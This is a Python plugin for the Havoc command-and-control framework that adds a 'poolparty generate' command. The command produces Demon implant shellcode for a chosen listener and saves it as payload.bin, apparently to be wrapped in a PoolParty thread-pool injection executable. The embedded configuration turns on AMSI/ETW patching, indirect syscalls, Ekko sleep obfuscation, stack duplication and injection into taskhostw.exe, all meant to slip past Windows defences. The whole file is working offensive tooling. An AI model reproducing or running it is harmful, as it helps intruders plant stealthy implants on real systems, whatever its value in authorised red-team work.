#!/usr/bin/env python
#Author : Cipher007

from havoc import Demon, RegisterCommand, RegisterModule
import havoc
import os
from base64 import b64decode, b64encode


#cwd = os.getcwd()
cwd = "/home/cipher/Github/havoc-PoolParty"
shellcode_file_path = cwd + "/payload.bin"

def generate_payload(demon, arch, listener):
	demon.ConsoleWrite(demon.CONSOLE_INFO, "Generating shellcode")
	arch = str(arch)
	listener = str(listener)
	havoc.GeneratePayload(save_shellcode,
            "Demon",
            listener,
            arch,
            "Windows Shellcode",
            "{ \
                \"Amsi/Etw Patch\": \"Hardware breakpoints\", \
                \"Indirect Syscall\": true,  \
                \"Sleep Jmp Gadget\": \"None\",  \
                \"Injection\": { \
                    \"Alloc\": \"Native/Syscall\", \
                    \"Execute\": \"Native/Syscall\", \
                    \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\taskhostw.exe\", \
                    \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\taskhostw.exe\" \
                }, \
                \"Jitter\": \"15\", \
                \"Proxy Loading\": \"RtlQueueWorkItem\", \
                \"Sleep\": \"17\", \
                \"Sleep Technique\": \"Ekko\", \
                \"Stack Duplication\": true \
            }"
        )
	demon.ConsoleWrite(demon.CONSOLE_INFO, "Saving shellcode to a file")
	demon.ConsoleWrite(demon.CONSOLE_INFO, "Generating PoolParty.exe file with new shellcode")
	#os.system(f"python3 generate.py -f {shellcode_file_path} ")
	demon.ConsoleWrite(demon.CONSOLE_INFO, "PoolParty ready to use!")
	return False

def generate(demonID, *params):
	TaskID : str = None
	demon : Demon = None
	demon = Demon(demonID)

	arch = ""
	listener = ""

	num_params = len(params)
	listeners = havoc.GetListeners()

	if num_params != 4 or params[0] == 'help' or params[0] == '-h':
		demon.ConsoleWrite(demon.CONSOLE_INFO, "USAGE : ")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "poolparty generate -a {x86/x64} -l {listener name}")
		demon.ConsoleWrite(demon.CONSOLE_INFO, 'AVAILABLE LISTENERS : ')
		if len(listeners) == 0:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, "No Listeners Running!!!")
		else:
			for listen in listeners:
				demon.ConsoleWrite(demon.CONSOLE_INFO, f'-   {listen}')
		return False
	
	elif params[1] != 'x86' and params[1] != 'x64':
		demon.ConsoleWrite(demon.CONSOLE_ERROR, "Please select either x86 or x64 as your shellcode")
		return False

	else:
		arch = params[1]
		listener = params[3]
		demon.ConsoleWrite(demon.CONSOLE_INFO, f"{arch} - {listener}")
		if listener not in listeners:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, "Listener is Invalid!")
			demon.ConsoleWrite(demon.CONSOLE_INFO, 'AVAILABLE LISTENERS : ')
			for listen in listeners:
				demon.ConsoleWrite(demon.CONSOLE_INFO, f'-   {listen}')
			return False

		else:
			demon.ConsoleWrite(demon.CONSOLE_INFO, f"Generating payload for {arch} with listener as {listener}")
	
			TaskID = generate_payload(demon, arch, listener)
			return TaskID

def save_shellcode(data):
	with open(shellcode_file_path, "wb") as file:
		file.write(b64decode(data))
	file.close()

RegisterModule("poolparty", "Windows Thread Pool Injection Module", "", "", "", "")
RegisterCommand(generate, "poolparty", "generate", "Generate the PoolParty executable",0, "", "")